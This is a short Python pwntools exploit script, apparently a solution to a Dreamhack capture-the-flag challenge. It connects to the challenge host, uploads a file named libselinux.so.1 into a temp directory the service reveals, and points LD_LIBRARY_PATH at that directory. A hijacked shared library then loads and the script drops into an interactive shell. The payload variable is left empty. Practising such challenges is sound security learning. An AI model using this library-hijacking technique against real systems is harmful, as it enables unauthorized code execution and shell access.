from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14208
r = remote(HOST, PORT)

payload=b''
r.sendlineafter(b'> ', b'3')
r.recvuntil(b'is: ')
tmp_dir = r.recvline().strip()

r.sendlineafter(b'> ', b'4')
r.sendlineafter(b'name: ', b'libselinux.so.1')
r.sendlineafter(b': ', payload)
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'> ', b'2')
r.sendline(b'LD_LIBRARY_PATH')
r.sendline(tmp_dir)

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'id\n', b'i')
r.interactive()